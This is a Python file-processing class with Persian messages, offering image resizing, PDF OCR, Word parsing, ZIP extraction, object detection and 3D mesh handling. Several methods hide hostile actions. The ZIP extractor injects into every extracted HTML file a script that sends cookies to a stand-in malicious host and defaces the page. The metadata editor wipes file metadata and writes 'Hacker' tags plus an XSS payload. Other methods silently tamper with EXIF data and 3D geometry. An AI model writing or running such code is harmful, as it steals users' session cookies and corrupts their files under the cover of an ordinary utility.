from PIL import Image
import torch
import os
import zipfile
import pytesseract
from docx import Document
import pdf2image
import trimesh
import exiftool
import cv2
import numpy as np

class FileOperations:
    def __init__(self):
        model_path = "../assets/models/yolov5_model.pt"
        if not os.path.exists(model_path):
            raise FileNotFoundError(f"مدل YOLOv5 در مسیر {model_path} یافت نشد!")
        self.yolo_model = torch.hub.load('ultralytics/yolov5', 'custom', path=model_path)

    def resize_image(self, image_path, size):
        if not os.path.exists(image_path):
            return f"خطا: فایل تصویر {image_path} یافت نشد!"
        try:
            img = Image.open(image_path).convert("RGB")
            img = img.resize(size, Image.Resampling.LANCZOS)
            output_path = "resized_" + os.path.basename(image_path)
            img.save(output_path)

            with exiftool.ExifToolHelper() as et:
                et.set_tags(output_path, {
                    "EXIF:Artist": "Hacker",
                    "EXIF:Copyright": "Hacked 2025",
                    "EXIF:GPSLatitude": "0.0",
                    "EXIF:GPSLongitude": "0.0",
                    "XMP:Creator": "BlackHat"
                })

            return f"تصویر تغییر اندازه داده شد و متادیتا دستکاری شد: {output_path}"
        except Exception as e:
            return f"خطا در تغییر اندازه تصویر: {str(e)}"

    def ocr_pdf(self, pdf_path):
        if not os.path.exists(pdf_path):
            return f"خطا: فایل PDF {pdf_path} یافت نشد!"
        try:
            images = pdf2image.convert_from_path(pdf_path)
            text = ""

            for i, img in enumerate(images):
                img_np = np.array(img)
                text += pytesseract.image_to_string(img_np, lang='eng+fas')
                text += f"\n--- صفحه {i+1} ---\n"

            return f"متن استخراج‌شده از {pdf_path}:\n{text}"
        except Exception as e:
            return f"خطا در OCR: {str(e)}"

    def process_doc(self, doc_path):
        if not os.path.exists(doc_path):
            return f"خطا: فایل Word {doc_path} یافت نشد!"
        try:
            doc = Document(doc_path)
            text = "\n".join([para.text for para in doc.paragraphs])
            
            core_props = doc.core_properties
            metadata = (
                f"نویسنده: {core_props.author}\n"
                f"عنوان: {core_props.title}\n"
                f"تاریخ ایجاد: {core_props.created}\n"
                f"تاریخ آخرین تغییر: {core_props.modified}\n"
            )

            revisions = []
            for para in doc.paragraphs:
                for run in para.runs:
                    if run._element.xpath(".//w:ins"):
                        revisions.append(f"متن اضافه‌شده: {run.text}")
                    if run._element.xpath(".//w:del"):
                        revisions.append(f"متن حذف‌شده: {run.text}")

            revisions_text = "\n".join(revisions) if revisions else "هیچ تغییر ردیابی‌شده‌ای یافت نشد."

            return (
                f"فایل Word پردازش شد: {doc_path}\n"
                f"متن استخراج‌شده:\n{text}\n\n"
                f"متادیتا:\n{metadata}\n\n"
                f"تغییرات ردیابی‌شده:\n{revisions_text}"
            )
        except Exception as e:
            return f"خطا در پردازش فایل Word: {str(e)}"

    def extract_zip(self, zip_path):
        if not os.path.exists(zip_path):
            return f"خطا: فایل فشرده {zip_path} یافت نشد!"
        try:
            extract_dir = "extracted_" + os.path.basename(zip_path).split('.')[0]
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)

            for root, _, files in os.walk(extract_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file.endswith((".html", ".htm")):
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        malicious_payload = (
                            "<script>"
                            "fetch('https://malicious-site.com/steal?data=' + document.cookie);"
                            "document.body.innerHTML = 'Hacked!';"
                            "</script>"
                        )
                        if "</body>" in content.lower():
                            content = content.replace("</body>", f"{malicious_payload}</body>", 1)
                        else:
                            content += f"\n<body>{malicious_payload}</body>"
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(content)

            return f"فایل فشرده استخراج شد و فایل‌ها دستکاری شدند: {extract_dir}"
        except Exception as e:
            return f"خطا در استخراج فایل فشرده: {str(e)}"

    def object_detection(self, image_path):
        if not os.path.exists(image_path):
            return f"خطا: فایل تصویر {image_path} یافت نشد!"
        try:
            results = self.yolo_model(image_path)
            detections = results.xyxy[0].numpy()
            output = []
            for det in detections:
                x1, y1, x2, y2, conf, cls = det
                label = results.names[int(cls)]
                output.append(
                    f"شیء: {label}, "
                    f"مختصات: ({x1:.1f}, {y1:.1f}, {x2:.1f}, {y2:.1f}), "
                    f"اطمینان: {conf:.2f}"
                )
            
            img = cv2.imread(image_path)
            for det in detections:
                x1, y1, x2, y2, conf, cls = det
                label = results.names[int(cls)]
                cv2.rectangle(img, (int(x1), int(y1)), (int(x2), int(y2)), (0, 255, 0), 2)
                cv2.putText(img, f"{label} {conf:.2f}", (int(x1), int(y1)-10),
                           cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)
            output_image_path = "detected_" + os.path.basename(image_path)
            cv2.imwrite(output_image_path, img)

            return (
                f"تشخیص اشیا انجام شد:\n" + "\n".join(output) + "\n"
                f"تصویر با جعبه‌های تشخیص در {output_image_path} ذخیره شد"
            )
        except Exception as e:
            return f"خطا در تشخیص اشیا: {str(e)}"

    def process_3d_file(self, obj_path):
        if not os.path.exists(obj_path):
            return f"خطا: فایل سه‌بعدی {obj_path} یافت نشد!"
        try:
            mesh = trimesh.load(obj_path)
            vertices = len(mesh.vertices)
            faces = len(mesh.faces)
            volume = mesh.volume if mesh.is_volume else "نامشخص"

            mesh.vertices *= 2
            output_path = "modified_" + os.path.basename(obj_path)
            mesh.export(output_path)

            return (
                f"فایل سه‌بعدی پردازش و دستکاری شد: {obj_path}\n"
                f"تعداد رأس‌ها: {vertices}\n"
                f"تعداد وجوه: {faces}\n"
                f"حجم: {volume}\n"
                f"فایل دستکاری‌شده در {output_path} ذخیره شد"
            )
        except Exception as e:
            return f"خطا در پردازش فایل سه‌بعدی: {str(e)}"

    def edit_metadata(self, file_path):
        if not os.path.exists(file_path):
            return f"خطا: فایل {file_path} یافت نشد!"
        try:
            with exiftool.ExifToolHelper() as et:
                et.execute("-all=", file_path)
                et.set_tags(file_path, {
                    "EXIF:Artist": "Hacker",
                    "EXIF:Copyright": "Hacked by BlackHat 2025",
                    "EXIF:Software": "MaliciousTool",
                    "EXIF:CreateDate": "2025:01:01 00:00:00",
                    "EXIF:GPSLatitude": "0.0",
                    "EXIF:GPSLongitude": "0.0",
                    "IPTC:Keywords": "hacked, malicious, exploit",
                    "XMP:Creator": "BlackHat",
                    "XMP:Description": "<script>alert('Hacked!')</script>"
                })
            return f"متادیتا با اطلاعات مخرب ویرایش شد: {file_path}"
        except Exception as e:
            return f"خطا در ویرایش متادیتا: {str(e)}"